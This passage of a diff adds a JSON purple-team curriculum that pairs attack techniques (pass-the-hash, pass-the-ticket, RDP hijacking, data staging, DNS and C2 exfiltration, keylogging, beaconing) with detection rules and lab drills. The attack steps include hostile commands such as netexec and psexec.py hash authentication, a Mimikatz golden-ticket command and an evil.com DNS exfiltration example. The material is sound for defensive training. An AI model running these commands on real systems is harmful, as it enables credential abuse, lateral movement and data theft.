+            "Run nmap scan on a lab network. Verify Zeek/RITA detects the scanning pattern. Then run a slow scan (1 port/minute) \u2014 does your detection still catch it? Set up a filter to exclude known scanner IPs."
+          ],
+          "common_mistakes": [
+            "Not deploying network monitoring internally (only at internet edge)",
+            "Not baselining legitimate scanner activity (Nessus SCCM)",
+            "Setting port-scan thresholds too high (missing slow scans) or too low (too noisy)"
+          ]
+        },
+        {
+          "id": "pass-the-hash-vs-ntlm-monitoring",
+          "title": "Pass-the-Hash (T1550.002) vs. NTLM Monitoring & Relay Protections",
+          "concepts": [
+            "Pass-the-Hash (PtH): authenticate using an NTLM hash without knowing the plaintext password",
+            "PtH uses NTLM authentication \u2014 any system accepting NTLM auth is vulnerable",
+            "Detection: NTLM network logons (Event 4624 Logon Type 3) with unusual patterns \u2014 source timing accounts",
+            "NTLM relay: attacker intercepts authentication and relays it to another system (Responder ntlmrelayx)",
+            "NTLM relay protections: SMB signing LDAP channel binding EPA (Extended Protection for Authentication)"
+          ],
+          "key_facts": [
+            "Event 4624 Logon Type 3 (Network) with Authentication Package = NTLM indicates NTLM network logon",
+            "Event 4624 with LogonProcessName = NtLmSsp confirms NTLM (not Kerberos) authentication",
+            "SMB Signing (required on all systems) prevents NTLM relay to SMB",
+            "LDAP Channel Binding + LDAP Signing prevents NTLM relay to LDAP/AD"
+          ],
+          "attack_side": {
+            "technique": "Use stolen NTLM hashes to authenticate to remote systems without knowing the plaintext password",
+            "attack_steps": [
+              "Obtain NTLM hashes from LSASS dump (Mimikatz) NTDS.dit or SAM extraction",
+              "Pass-the-Hash: netexec smb target -u Administrator -H NTLM_hash",
+              "PtH with Impacket: psexec.py -hashes :NTLM_hash user@target",
+              "Alternative: NTLM relay \u2014 capture authentication (Responder) and relay to another target (ntlmrelayx)",
+              "Gain code execution on target system via SMB/WMI/WinRM with relayed or passed hash"
+            ],
+            "tools": [
+              "netexec (CrackMapExec)",
+              "Impacket (psexec.py wmiexec.py)",
+              "Responder (LLMNR/NBT-NS poisoning)",
+              "ntlmrelayx",
+              "Mimikatz (sekurlsa::pth)",
+              "Evil-WinRM"
+            ],
+            "attack_techniques": [
+              "T1550.002",
+              "T1075",
+              "T1557.001",
+              "T1021.002"
+            ],
+            "killchain_stage": "lateral-movement"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect NTLM authentication from unexpected sources to unexpected destinations or NTLM relay patterns",
+            "logs": [
+              "Windows Security Event 4624 (successful logon) \u2014 Logon Type 3 Authentication Package NTLM",
+              "Windows Security Event 4625 (failed logon) \u2014 brute force / scanning attempts",
+              "Windows Security Event 4776 (NTLM authentication attempt) \u2014 domain controller NTLM auth",
+              "Sysmon Event 3 (Network Connection) \u2014 SMB (port 445) WMI (port 135) WinRM (port 5985)",
+              "Windows Event 8004 (NTLM authentication) for NTLM audit logging"
+            ],
+            "detection_rules": [
+              "Sigma: win_pass_the_hash_ntlm \u2014 Event 4624 Logon Type 3 with NTLM auth from unexpected host",
+              "Splunk: index=windows EventCode=4624 LogonType=3 AuthenticationPackage=NTLM | stats by Computer TargetUserName IpAddress",
+              "Sigma: win_ntlm_relay \u2014 Event 4624 where source and destination are unexpected for the account",
+              "Baseline: alert on NTLM auth from systems that normally use Kerberos"
+            ],
+            "tools": [
+              "Windows NTLM Auditing (Event 8004)",
+              "Zeek/Suricata (SMB traffic analysis)",
+              "Microsoft Defender for Identity",
+              "Splunk/Elastic SIEM"
+            ],
+            "controls": [
+              "Disable NTLMv1 (enforce NTLMv2)",
+              "Enable SMB Signing on all systems",
+              "LDAP Channel Binding & Signing",
+              "Restrict NTLM: Outgoing/Incoming",
+              "Tiered admin model"
+            ]
+          },
+          "gap_analysis": "NTLM is still widely used in many environments \u2014 disabling it entirely breaks applications. PtH is silent because it uses legitimate NTLM authentication. Gap: many orgs dont monitor NTLM usage patterns to distinguish PtH from legitimate auth. NTLM relay can be defeated with SMB Signing but many orgs havent enforced it globally.",
+          "drills": [
+            "Execute PtH using netexec with a stolen hash. Examine Event 4624 \u2014 verify Logon Type 3 with NTLM authentication. Write a Sigma rule to detect NTLM logons from unexpected sources. Then enable SMB Signing and attempt NTLM relay \u2014 verify it fails."
+          ],
+          "common_mistakes": [
+            "Not distinguishing NTLM from Kerberos in Event 4624 \u2014 they look similar without checking Authentication Package field",
+            "Only looking at failed logons (4625) and missing successful PtH (4624)",
+            "Not enforcing SMB Signing globally (partial deployment doesnt help)"
+          ]
+        },
+        {
+          "id": "rdp-lateral-vs-rdp-monitoring",
+          "title": "RDP Lateral Movement (T1021.001) vs. RDP Session Monitoring",
+          "concepts": [
+            "Remote Desktop Protocol (RDP): graphical remote access commonly used for lateral movement",
+            "Attackers use RDP for interactive lateral movement especially after obtaining credentials",
+            "RDP hijacking: stealing active RDP sessions via tscon (T1563.002)",
+            "Detection: monitor RDP connections (Event 4624 Logon Type 10) source/destination and session activity",
+            "RDP over reverse proxy and RDP through SSH tunnels are also used"
+          ],
+          "key_facts": [
+            "Event 4624 Logon Type 10 (RemoteInteractive) indicates RDP logon",
+            "Event 4778 (session reconnection) and 4779 (session disconnect) track RDP session state",
+            "tscon session_id /dest:other_session allows stealing RDP sessions without password (requires SYSTEM)",
+            "TerminalServices-* event logs provide detailed RDP session information"
+          ],
+          "attack_side": {
+            "technique": "Use RDP for lateral movement to interactively control target systems",
+            "attack_steps": [
+              "Obtain valid credentials (via credential theft brute force or phishing)",
+              "Connect via RDP: mstsc /v:target_ip or xfreerdp /v:target /u:user",
+              "RDP session hijacking: query user (find sessions) then tscon session /dest:SESSIONNAME",
+              "Use RDP for data exfiltration via clipboard drive mapping or file transfer",
+              "Pivot through RDP to additional systems"
+            ],
+            "tools": [
+              "mstsc.exe (built-in RDP)",
+              "xfreerdp",
+              "tscon (session hijack)",
+              "Cobalt Strike (RDP lateral)",
+              "Evil-WinRM",
+              "Hydra (RDP brute force)"
+            ],
+            "attack_techniques": [
+              "T1021.001",
+              "T1563.002",
+              "T1076",
+              "T1110.001"
+            ],
+            "killchain_stage": "lateral-movement"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect RDP connections from unexpected sources session hijacking via tscon and brute-force RDP attempts",
+            "logs": [
+              "Windows Security Event 4624 (Logon Type 10 = RemoteInteractive) \u2014 RDP logon",
+              "Windows Security Event 4625 (failed logon Type 10) \u2014 RDP brute force",
+              "Windows TerminalServices-LocalSessionManager/Operational Event 21 22 25 (RDP session events)",
+              "Sysmon Event 1 (tscon.exe execution \u2014 session hijacking indicator)",
+              "Sysmon Event 3 (Network Connection) \u2014 port 3389 connections"
+            ],
+            "detection_rules": [
+              "Sigma: win_rdp_logon_from_unexpected_source \u2014 Event 4624 Logon Type 10 from unexpected IP",
+              "Sigma: win_tscon_session_hijack \u2014 tscon.exe execution indicating RDP session hijacking",
+              "Sigma: win_rdp_brute_force \u2014 Event 4625 Logon Type 10 count > threshold in time window",
+              "Splunk: index=windows EventCode=4624 LogonType=10 | stats by IpAddress TargetUserName Computer"
+            ],
+            "tools": [
+              "Windows Terminal Services logging",
+              "Sysmon",
+              "Zeek (RDP traffic analysis)",
+              "EDR",
+              "VPN/Zero Trust Network Access (ZTNA)"
+            ],
+            "controls": [
+              "NLA (Network Level Authentication) for RDP",
+              "RDP Gateway with MFA",
+              "Account lockout policy",
+              "Restrict RDP via firewall (only from jump boxes)",
+              "ZTNA replacing VPN+RDP"
+            ]
+          },
+          "gap_analysis": "RDP session hijacking (tscon) is hard to detect because the session appears to continue normally. BlueKeep (CVE-2019-0708) allowed unauthenticated RDP code execution. Gap: many orgs dont enforce NLA allowing pre-authentication attacks. RDP over non-standard ports (port redirection) evades simple port-based monitoring.",
+          "drills": [
+            "Connect via RDP to a target with stolen credentials. Verify Event 4624 Logon Type 10 fires. Then perform tscon session hijacking \u2014 verify Sysmon Event 1 captures tscon.exe. Write Sigma rules for both. Implement RDP Gateway and show how it adds MFA."
+          ],
+          "common_mistakes": [
+            "Not distinguishing Logon Type 10 (RDP) from Type 7 (credential delegation) in Event 4624",
+            "Allowing RDP from any source (no jump box / ZTNA)",
+            "Not enforcing NLA which prevents many RDP-based attacks"
+          ]
+        },
+        {
+          "id": "pass-the-ticket-vs-kerberos-monitoring",
+          "title": "Pass-the-Ticket (T1550.003) vs. Kerberos Event Monitoring",
+          "concepts": [
+            "Pass-the-Ticket (PtT): inject a stolen Kerberos ticket into the current logon session to authenticate as another user",
+            "Tickets can be Ticket Granting Ticket (TGT) for domain-wide access or Service Ticket (TGS) for specific services",
+            "Golden Ticket: forged TGT using the krbtgt hash \u2014 grants persistent domain admin access",
+            "Silver Ticket: forged TGS using a service account hash \u2014 grants access to specific services",
+            "Detection: monitor for tickets with anomalies (wrong encryption impossible session forged PAC)"
+          ],
+          "key_facts": [
+            "Kerberos tickets are stored in the LSASS process memory and can be injected via Mimikatz kerberos::ptt",
+            "Golden Ticket TGTs can be forged for any user including non-existent ones \u2014 valid as long as krbtgt hash is known",
+            "Event 4769 (TGS Request) and 4768 (TGT Request) log Kerberos activity",
+            "Event 4624 Logon Type 3 with Kerberos authentication may indicate PtT"
+          ],
+          "attack_side": {
+            "technique": "Inject stolen or forged Kerberos tickets to authenticate as another user without their password",
+            "attack_steps": [
+              "Obtain tickets: extract from LSASS (Mimikatz sekurlsa::tickets) or forge them",
+              "Golden Ticket: Mimikatz kerberos::golden /user:Administrator /domain:corp /sid:S-1-5... /krbtgt:hash /ptt",
+              "Silver Ticket: forge TGS for specific service using service account hash",
+              "Inject ticket: Mimikatz kerberos::ptt ticket.kirbi or Rubeus ptt /ticket:base64",
+              "Access services as the ticketed user \u2014 no password or hash needed for authentication"
+            ],
+            "tools": [
+              "Mimikatz (kerberos::ptt kerberos::golden)",
+              "Rubeus (ptt golden)",
+              "Impacket (ticketer.py)",
+              "kekeo"
+            ],
+            "attack_techniques": [
+              "T1550.003",
+              "T1097",
+              "T1558.001",
+              "T1558.002"
+            ],
+            "killchain_stage": "lateral-movement"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect forged/stolen ticket usage: tickets from unexpected systems ticket anomalies and impossible session patterns",
+            "logs": [
+              "Windows Security Event 4768 (Kerberos TGT Request) \u2014 ticket request from unexpected host",
+              "Windows Security Event 4769 (Kerberos TGS Request) \u2014 service ticket request with anomalies",
+              "Windows Security Event 4624 (Logon Type 3 with Kerberos) \u2014 network logon using Kerberos",
+              "Sysmon Event 1 (Mimikatz or Rubeus execution for ticket injection)"
+            ],
+            "detection_rules": [
+              "Sigma: win_kerberos_golden_ticket \u2014 Event 4769 for a user account not in AD (forged ticket)",
+              "Sigma: win_pass_the_hash_kerberos \u2014 Event 4624 Kerberos logon from unexpected source",
+              "Splunk: index=windows EventCode=4768 OR EventCode=4769 | where match(IpAddress unexpected)",
+              "Detect ticket lifetime anomalies: tickets with 10-year expiry (common in forged tickets)"
+            ],
+            "tools": [
+              "Windows DC Kerberos event logging",
+              "Microsoft Defender for Identity (Golden/Silver Ticket detection)",
+              "Splunk/Elastic SIEM",
+              "Advanced Threat Analytics"
+            ],
+            "controls": [
+              "Regular krbtgt password resets (twice to invalidate old tickets)",
+              "Privileged Access Management (PAM)",
+              "Microsoft Advanced Threat Analytics",
+              "Monitoring 4768/4769 for anomalies"
+            ]
+          },
+          "gap_analysis": "Forged tickets (Golden/Silver) are very hard to detect because they are cryptographically valid. Detection focuses on behavioral anomalies: tickets used from unexpected locations tickets for disabled/deleted accounts or tickets with unusual lifetimes. Gap: krbtgt must be reset TWICE (not once) to invalidate existing Golden Tickets. Many orgs dont know this.",
+          "drills": [
+            "Forge a Golden Ticket using Mimikatz with the krbtgt hash (from DCSync lab). Inject and use it to access a DC. Examine Event 4769 \u2014 what anomalies are visible? Write a detection for tickets with abnormally long lifetimes. Then reset krbtgt twice and show the Golden Ticket is invalidated."
+          ],
+          "common_mistakes": [
+            "Not resetting krbtgt twice (once leaves the old hash active)",
+            "Only monitoring TGS (4769) and not TGT (4768) events",
+            "Not investigating tickets for accounts that dont exist in AD (clear sign of forgery)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "collection-exfiltration-pairings",
+      "title": "Collection & Exfiltration \u2014 Data Staging & Theft vs. FIM, DLP & Egress Monitoring",
+      "difficulty": "advanced",
+      "prerequisites": [
+        "discovery-lateral-pairings"
+      ],
+      "objective": "Learner can execute data collection and exfiltration techniques and build detections using file integrity monitoring, DLP, and network egress analysis.",
+      "topics": [
+        {
+          "id": "data-staging-vs-fim",
+          "title": "Data Staging (T1074) vs. File Integrity Monitoring",
+          "concepts": [
+            "Data staging: collecting data from multiple locations into a single directory before exfiltration",
+            "Attackers use temp directories recycle bin or hidden folders for staging",
+            "Common staging: copy sensitive files to C:\\Users\\Public\\ or %TEMP% then archive (zip rar 7z)",
+            "File Integrity Monitoring (FIM): monitors file system changes \u2014 creation modification deletion",
+            "Sysmon Event 11 (FileCreate) and Event 2 (FileCreationTimeChanged) detect staging activity"
+          ],
+          "key_facts": [
+            "Attackers prefer staging in directories with high noise (temp public) to blend in",
+            "Compressing staged data reduces exfiltration time and evades size-based DLP",
+            "Sysmon Event 11 can monitor specific directories for file creation",
+            "Data staging often involves unusual file access patterns \u2014 bulk reads of sensitive directories"
+          ],
+          "attack_side": {
+            "technique": "Collect and stage sensitive data from across the network into a central location for exfiltration",
+            "attack_steps": [
+              "Discover sensitive data: search file shares databases email browser profiles",
+              "Copy data to staging directory: copy *.docx C:\\Users\\Public\\Staging\\",
+              "Archive data: 7z a -p archive.7z C:\\Users\\Public\\Staging\\* (password-protected)",
+              "Stage on a single system for exfiltration (T1074.002 Remote Data Staging)",
+              "Delete original copies to cover tracks (optional)"
+            ],
+            "tools": [
+              "7-Zip",
+              "WinRAR",
+              "robocopy",
+              "xcopy",
+              "PowerShell (Compress-Archive)",
+              "custom collection scripts"
+            ],
+            "attack_techniques": [
+              "T1074.001",
+              "T1074.002",
+              "T1560.001",
+              "T1005",
+              "T1213"
+            ],
+            "killchain_stage": "collection"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect bulk file copy operations archive creation in unusual locations and unusual file access patterns",
+            "logs": [
+              "Sysmon Event 11 (FileCreate) \u2014 files created in staging directories (temp public recycle bin)",
+              "Sysmon Event 1 (Process Creation) \u2014 archive tools (7z.exe winrar.exe) executing with unusual arguments",
+              "Windows Security Event 4663 (Object Access) \u2014 file access auditing on sensitive directories",
+              "Sysmon Event 3 (Network Connection) \u2014 data transfer to staging system"
+            ],
+            "detection_rules": [
+              "Sigma: file_create_win_data_staging \u2014 Event 11 with many files created in temp/public directories in short time",
+              "Sigma: proc_creation_win_archive_tool_in_temp \u2014 7z.exe or rar.exe executing from temp directories",
+              "Splunk: index=sysmon EventCode=11 TargetFilename=*C:\\Users\\Public\\* | stats count by Computer | where count > 50",
+              "FIM: alert on bulk file modifications in sensitive directories"
+            ],
+            "tools": [
+              "Sysmon (file creation monitoring)",
+              "File Integrity Monitoring (FIM)",
+              "Tripwire",
+              "EDR",
+              "Windows audit object access"
+            ],
+            "controls": [
+              "File access auditing on sensitive directories",
+              "FIM on critical data stores",
+              "Data classification labels (DLP integration)"
+            ]
+          },
+          "gap_analysis": "Data staging in noisy directories (temp public) blends with normal activity. Archive creation is common for legitimate purposes. Gap: FIM tools monitor for changes but may not detect bulk READ access to sensitive data. Must correlate file access with subsequent staging and archive creation.",
+          "drills": [
+            "Stage 50 files from a file share to C:\\Users\\Public\\Staging\\. Archive with 7z. Check which Sysmon events fire. Write Sigma rules for bulk file creation in staging areas and archive tool execution from non-standard paths."
+          ],
+          "common_mistakes": [
+            "Only monitoring file creation not file READ access to sensitive data",
+            "Not alerting on archive tool usage in unusual contexts",
+            "Missing remote data staging (data collected on one system staged on another)"
+          ]
+        },
+        {
+          "id": "exfiltration-over-c2-vs-dlp",
+          "title": "Exfiltration Over C2 (T1041) & Web Services (T1567) vs. DLP & Egress Filtering",
+          "concepts": [
+            "Exfiltration over C2 channel: encoding data into the existing C2 communication (HTTPS beacons DNS queries)",
+            "Exfiltration over web services: uploading data to legitimate cloud storage (Mega Dropbox Google Drive S3)",
+            "DLP (Data Loss Prevention): monitors egress traffic and endpoints for sensitive data patterns",
+            "Egress filtering: restrict outbound connections to known/allowed destinations",
+            "Network-based detection: monitor for unusual outbound data volume beaconing patterns and new destinations"
+          ],
+          "key_facts": [
+            "Median time from initial access to exfiltration is under 2 days (2024 incident data)",
+            "Data encoded in DNS queries (DNS tunneling) bypasses HTTPS-based DLP",
+            "Cloud exfiltration to legitimate services (Mega AWS S3) may not be on blocklists",
+            "Zeek http.log and ssl.log capture outbound web traffic metadata for analysis"
+          ],
+          "attack_side": {
+            "technique": "Exfiltrate staged data over the C2 channel or via web services encoding to evade detection",
+            "attack_steps": [
+              "Exfil over C2: beacon sends data chunks in HTTP POST body or DNS TXT queries",
+              "Exfil via web service: upload to Mega/Dropbox/Google Drive using stolen API keys",
+              "Exfil via protocol tunneling: SSH tunnel DNS tunneling (iodine dnscat2)",
+              "Rate-limiting: exfiltrate slowly (low and slow) to avoid volume-based detection",
+              "Alternative: exfil via physical media (USB) or alternative protocols (ICMP NTP)"
+            ],
+            "tools": [
+              "Cobalt Strike (data exfiltration commands)",
+              "dnscat2 (DNS exfiltration)",
+              "iodine (DNS tunneling)",
+              "rclone (cloud exfiltration)",
+              "Mega CLI"
+            ],
+            "attack_techniques": [
+              "T1041",
+              "T1567.002",
+              "T1048",
+              "T1048.003",
+              "T1567.001",
+              "T1052.001"
+            ],
+            "killchain_stage": "exfiltration"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect unusual outbound data volume new/unknown destinations DNS tunneling patterns and DLP policy violations",
+            "logs": [
+              "Zeek conn.log \u2014 outbound connection volume analysis (bytes_out anomalies)",
+              "Zeek dns.log \u2014 DNS tunneling detection (high-entropy queries long domain names TXT record volume)",
+              "Zeek http.log / ssl.log \u2014 HTTPS connections to unknown/new destinations",
+              "DLP alerts \u2014 sensitive data patterns detected in outbound traffic",
+              "Sysmon Event 3 (Network Connection) \u2014 unexpected outbound connections",
+              "Firewall logs \u2014 egress traffic to non-standard destinations"
+            ],
+            "detection_rules": [
+              "Zeek/RITA: DNS tunneling detection (high entropy in subdomains unusual TXT record volume)",
+              "Sigma: net_connection_win_rclone_cloud \u2014 rclone.exe making connections to cloud storage",
+              "Splunk: index=zeek | stats sum(orig_bytes) by dest_ip | sort -sum(orig_bytes) \u2014 top data destinations",
+              "DLP: alert on credit card numbers SSNs classified keywords in outbound traffic"
+            ],
+            "tools": [
+              "Zeek (network metadata)",
+              "RITA (beaconing/exfil analysis)",
+              "DLP (Symantec Forcepoint Microsoft Purview)",
+              "Firewall egress filtering",
+              "CASB (Cloud Access Security Broker)",
+              "SWG (Secure Web Gateway)"
+            ],
+            "controls": [
+              "Egress filtering (default deny outbound)",
+              "DLP (endpoint + network)",
+              "CASB (cloud service monitoring)",
+              "DNS filtering (block known tunneling tools)",
+              "Network segmentation"
+            ]
+          },
+          "gap_analysis": "Encrypted exfiltration (HTTPS to legitimate cloud services) bypasses network-based DLP. DNS tunneling bypasses most network monitoring unless DNS-specific analysis is deployed. Slow exfiltration evades volume-based detection. Gap: many orgs allow broad egress access making it hard to identify anomalous destinations.",
+          "drills": [
+            "Exfiltrate data via three methods: HTTPS POST to a C2 DNS tunneling with dnscat2 and cloud upload with rclone. For each identify which detection catches it. Implement DNS tunneling detection with Zeek/RITA. Set up egress filtering and show it blocks unexpected destinations."
+          ],
+          "common_mistakes": [
+            "Not monitoring DNS for tunneling (only monitoring HTTP/HTTPS)",
+            "Allowing all egress HTTPS traffic (cant detect exfil to new destinations)",
+            "Not deploying DLP on endpoints (network-only DLP misses encrypted exfil)"
+          ]
+        },
+        {
+          "id": "screen-capture-keylogging-vs-edr",
+          "title": "Screen Capture & Keylogging (T1113 T1056) vs. EDR Behavior Monitoring",
+          "concepts": [
+            "Screen capture: taking screenshots of the user desktop to collect visual data (documents emails)",
+            "Keylogging: recording keystrokes to capture passwords messages and data entry",
+            "These techniques collect data without accessing files directly \u2014 harder to detect with file-based monitoring",
+            "EDR behavior monitoring: detects API calls associated with capture (BitBlt GetAsyncKeyState SetWindowsHookEx)",
+            "Windows API hooks used for capture can be detected via API call monitoring"
+          ],
+          "key_facts": [
+            "Screen capture uses GDI functions: BitBlt GetDC CreateCompatibleBitmap",
+            "Keylogging uses: SetWindowsHookEx (WH_KEYBOARD_LL) GetAsyncKeyState polling or kernel-mode filter drivers",
+            "Sysmon doesnt natively capture screen capture or keylogging API calls",
+            "EDR products monitor for suspicious API call patterns associated with these techniques"
+          ],
+          "attack_side": {
+            "technique": "Capture screen content and keystrokes to collect sensitive data including credentials and communications",
+            "attack_steps": [
+              "Screen capture: use PowerShell or C# to call BitBlt/GetDC and capture screen to image file",
+              "Keylogging: install keyboard hook via SetWindowsHookEx (WH_KEYBOARD_LL) or poll GetAsyncKeyState",
+              "Log captured data to file or exfiltrate via C2 channel",
+              "Periodic screen captures sent to C2 for analyst review"
+            ],
+            "tools": [
+              "Custom screen capture scripts",
+              "keyloggers (compiled C/C#)",
+              "PowerShell (System.Windows.Forms)",
+              "Cobalt Strike (screenshot command)",
+              "Metasploit (screenshot keyscan_start)"
+            ],
+            "attack_techniques": [
+              "T1113",
+              "T1056.001",
+              "T1115",
+              "T1123"
+            ],
+            "killchain_stage": "collection"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect processes making screen capture API calls keyboard hook installation and clipboard access",
+            "logs": [
+              "Sysmon Event 1 (Process Creation) \u2014 known capture tool execution",
+              "EDR API call monitoring \u2014 BitBlt GetAsyncKeyState SetWindowsHookEx OpenClipboard",
+              "Sysmon Event 11 (FileCreate) \u2014 image files (.png .jpg) created in unusual locations",
+              "Sysmon Event 7 (ImageLoaded) \u2014 gdi32.dll user32.dll loading by unusual processes"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_screen_capture_tool \u2014 known screenshot tool execution from non-standard process",
+              "EDR: alert on SetWindowsHookEx from non-interactive/unusual processes",
+              "EDR: alert on BitBlt/GetDC calls from unexpected processes (not browsers not snipping tool)",
+              "Splunk: index=sysmon EventCode=11 TargetFilename=*.bmp OR *.png in temp directories"
+            ],
+            "tools": [
+              "EDR (API monitoring: CrowdStrike Defender for Endpoint)",
+              "Sysmon (process monitoring)",
+              "Windows Defender Exploit Protection"
+            ],
+            "controls": [
+              "EDR API behavior monitoring",
+              "Windows Defender Exploit Protection (ASR rules)",
+              "Session isolation for privileged accounts"
+            ]
+          },
+          "gap_analysis": "Screen capture and keylogging use legitimate Windows APIs that also serve legitimate purposes creating false positives. Sysmon doesnt natively capture API calls \u2014 EDR is required for API-level detection. Gap: many EDRs dont alert on screen capture because too many legitimate apps take screenshots.",
+          "drills": [
+            "Run a keylogger and screen capture tool in lab. Check which EDR alerts fire. If EDR doesnt catch it implement detection via Sysmon process monitoring and file creation analysis. Write rules for image file creation in temp by non-standard processes."
+          ],
+          "common_mistakes": [
+            "Expecting Sysmon alone to detect keylogging (it cant \u2014 requires EDR API monitoring)",
+            "Not including clipboard monitoring (T1115) alongside keylogging",
+            "Ignoring audio/video capture (T1123 T1125) which are similar collection vectors"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "c2-infrastructure-capstone",
+      "title": "C2 Infrastructure \u2014 Beaconing & DNS Tunneling vs. Network Traffic Analysis (Capstone)",
+      "difficulty": "advanced",
+      "prerequisites": [
+        "collection-exfiltration-pairings"
+      ],
+      "objective": "Learner can establish C2 channels and detect them using Zeek network analysis, RITA beaconing detection, and DNS tunneling analytics, then run a complete purple team capstone exercise with BAS and metrics.",
+      "topics": [
+        {
+          "id": "c2-beaconing-vs-rita-zeek",
+          "title": "C2 Beaconing (T1071.001) vs. RITA & Zeek Beaconing Detection",
+          "concepts": [
+            "C2 beaconing: infected systems periodically contact a command and control server for instructions",
+            "Beacon patterns: regular intervals (jittered) specific data sizes consistent destinations",
+            "Common C2 protocols: HTTP/HTTPS (Cobalt Strike Empire) DNS (dnscat2) custom protocols",
+            "Zeek (Bro): network security monitor that logs all connection metadata (conn.log http.log ssl.log dns.log)",
+            "RITA (Real Intelligence Threat Analytics): analyzes Zeek logs for beaconing DNS tunneling and long connections"
+          ],
+          "key_facts": [
+            "Beaconing detection: low-variance inter-arrival times and consistent data sizes are strong C2 indicators",
+            "Zeek conn.log captures every connection: timestamp duration source destination service bytes",
+            "RITA analyzes Zeek logs for statistical beaconing patterns (TS data size correlations)",
+            "Cobalt Strike default beacon profile: 60s sleep with 0-20% jitter \u2014 easily detectable by RITA"
+          ],
+          "attack_side": {
+            "technique": "Establish a C2 channel via HTTP/HTTPS beaconing that mimics legitimate web traffic",
+            "attack_steps": [
+              "Deploy C2 framework (Cobalt Strike Mythic Empire) with HTTPS listener",
+              "Configure beacon profile: user-agent sleep interval jitter (use high jitter to evade detection)",
+              "Execute beacon on victim: connects to C2 over HTTPS at regular intervals",
+              "C2 server issues commands; beacon executes and returns results in next check-in",
+              "Blend with legitimate traffic: use domain fronting or legitimate cloud services for C2 infrastructure"
+            ],
+            "tools": [
+              "Cobalt Strike",
+              "Mythic",
+              "Empire",
+              "Sliver",
+              "Havoc",
+              "Brute Ratel"
+            ],
+            "attack_techniques": [
+              "T1071.001",
+              "T1573.002",
+              "T1568.002",
+              "T1090.004"
+            ],
+            "killchain_stage": "command-and-control"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect beaconing patterns: regular connection intervals consistent data sizes and connections to low-reputation domains",
+            "logs": [
+              "Zeek conn.log \u2014 connection metadata for beaconing statistical analysis",
+              "Zeek ssl.log \u2014 TLS connections (JA3/JA3S fingerprinting for C2 identification)",
+              "Zeek http.log \u2014 HTTP request patterns and user-agent analysis",
+              "Firewall logs \u2014 periodic connections to same external destination",
+              "DNS logs \u2014 domain resolution patterns for C2 infrastructure"
+            ],
+            "detection_rules": [
+              "RITA: beaconing analysis from conn.log (low TS score indicates beaconing)",
+              "Zeek: JA3 fingerprint matching against known C2 frameworks (Cobalt Strike default JA3)",
+              "Splunk: index=zeek | stats avg(duration) stdev(duration) by id.orig_h id.resp_h | where stdev(duration) < threshold",
+              "Sigma: net_connection_win_c2_infrastructure \u2014 known C2 framework indicators"
+            ],
+            "tools": [
+              "Zeek (Bro)",
+              "RITA",
+              "Suricata",
+              "MITRE D3FEND: Connection Timeout behavioral analysis",
+              "JA3/JA3S TLS fingerprinting",
+              "Splunk/Elastic SIEM"
+            ],
+            "controls": [
+              "Egress filtering (default deny outbound)",
+              "TLS inspection (SSL interception)",
+              "DNS filtering",
+              "Network behavioral analytics",
+              "Threat intelligence feeds (C2 IP/domain lists)"
+            ]
+          },
+          "gap_analysis": "Domain fronting (using legitimate CDNs like Azure/AWS) makes C2 traffic look like it goes to trusted domains. TLS 1.3 and encrypted beacons hide payload content from TLS inspection. Gap: RITA beaconing detection requires Zeek deployment internally \u2014 many orgs only have Zeek at the perimeter missing internal C2. High-jitter beacons (50%+) evade statistical beaconing detection.",
+          "drills": [
+            "Deploy Cobalt Strike with HTTPS beacon in lab. Configure different sleep/jitter settings (60s/0% 300s/20% 600s/50%). Run RITA analysis on Zeek logs. Which beacon profiles are detected? Write custom Zeek scripts for specific beacon patterns. Then use domain fronting and show how it evades destination-based detection."
+          ],
+          "common_mistakes": [
+            "Not deploying Zeek internally (only at perimeter)",
+            "Only looking at destination IPs and not analyzing connection timing patterns",
+            "Forgetting JA3/JA3S fingerprinting which can identify C2 frameworks regardless of destination"
+          ]
+        },
+        {
+          "id": "dns-tunneling-vs-dns-analytics",
+          "title": "DNS Tunneling (T1071.004) vs. DNS Analytics & RITA",
+          "concepts": [
+            "DNS tunneling: encoding data in DNS queries/responses to bypass firewall rules (DNS is almost always allowed outbound)",
+            "Data exfiltration via DNS: data encoded in subdomain labels of DNS queries (Base32/Hex encoding)",
+            "DNS C2: command data returned in TXT records or CNAME responses",
+            "Common tools: dnscat2 iodine DNScat Cobalt Strike DNS beacon",
+            "Detection: high-entropy subdomain labels unusual query volumes large TXT records and long domain names"
+          ],
+          "key_facts": [
+            "DNS queries have a 253-character limit but attackers split data across multiple queries",
+            "TXT records can carry up to 4096 bytes per response \u2014 enough for command data",
+            "iodine and dnscat2 are the most common DNS tunneling tools",
+            "RITA detects DNS tunneling by analyzing query lengths entropy and TXT record frequency from Zeek dns.log"
+          ],
+          "attack_side": {
+            "technique": "Use DNS as a covert channel for C2 and data exfiltration encoding data in DNS queries and responses",
+            "attack_steps": [
+              "Set up DNS tunneling server (iodine dnscat2) with authoritative DNS for a controlled domain",
+              "Execute client on victim: encodes data in subdomain queries (e.g., data1.data2.data3.evil.com)",
+              "Data exfiltration: file contents Base32-encoded and sent as DNS query labels",
+              "C2 commands: returned via TXT records from the authoritative server",
+              "Bypasses firewalls because DNS (port 53) is typically allowed outbound"
+            ],
+            "tools": [
+              "dnscat2",
+              "iodine",
+              "dns2tcp",
+              "Cobalt Strike (DNS beacon)",
+              "PyExfil"
+            ],
+            "attack_techniques": [
+              "T1071.004",
+              "T1048",
+              "T1568.003",
+              "T1571"
+            ],
+            "killchain_stage": "command-and-control"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect DNS tunneling via high-entropy subdomain labels unusual query volumes large TXT records and domains with excessive subdomain depth",
+            "logs": [
+              "Zeek dns.log \u2014 DNS query metadata (query name type response)",
+              "Windows DNS Server debug/analytic logs",
+              "Firewall DNS logs",
+              "Sysmon Event 22 (DNS Query) \u2014 process-level DNS query attribution"
+            ],
+            "detection_rules": [
+              "RITA: DNS tunneling analysis (high entropy in subdomain labels long FQDNs excessive TXT records)",
+              "Zeek custom script: alert on DNS queries with subdomain entropy > threshold",
+              "Splunk: index=zeek | eval subdomain_len=len(query) | where subdomain_len > 50",
